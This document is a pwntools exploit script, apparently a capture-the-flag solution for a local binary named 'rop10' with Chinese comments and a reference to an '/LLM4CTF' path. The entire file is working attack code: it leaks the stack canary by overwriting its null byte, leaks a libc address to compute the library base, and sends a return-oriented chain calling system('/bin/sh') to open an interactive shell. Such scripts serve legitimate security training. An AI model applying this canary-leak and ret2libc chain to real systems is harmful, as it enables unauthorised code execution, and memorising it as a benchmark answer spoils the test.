from pwn import *

#can not run in "/LLM4CTF" file path
r=process('./rop10')

context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]
#gdb.attach(r)



#覆盖cannary第一个字节/x00使其被打印,注意sendafterline加入的'\n'会被read读入  
payload=b'b'*(24+1)
r.sendafter(b"What's your name?\n",payload)

s=r.recvline()
value=s[14:][:-20]
print(value)

canary=value[25:32].rjust(8,b'\x00')
print('canary: ',canary)

#还原canary
payload2=flat(
    b'b'*(0x30-8),
    canary
)
r.send(payload2)

# 读取栈里保存的libc相关地址，计算__libc_start_main地址 d90    e40 __libc_start_main+128
payload=b'b'*(0x38)
r.sendafter(b"What's your name?\n",payload)

s=r.recvline()
value=s[14:][:-20]
print(value)
print('show1_addr',hex(u64(value[0x38:].ljust(8,b'\x00'))))
libc_start_main_addr=u64(value[0x38:].ljust(8,b'\x00'))-0xd90+0xe40-128
print('libc_start_main_addr',hex((libc_start_main_addr)))
libc=ELF('./libc.so.6')
libc_addr=libc_start_main_addr - libc.symbols['__libc_start_main']

payload2=flat(
    b'b'*(0x30-8),
    canary,
    b'b'*8,#overwrite saved_rsp
    libc_addr+0x029139, #ret
    libc_addr+0x02a3e5, #pop rdi;ret;
    libc_addr+next(libc.search(b"/bin/sh\0")),
    libc_addr+libc.symbols['system']
)
r.send(payload2)
r.interactive()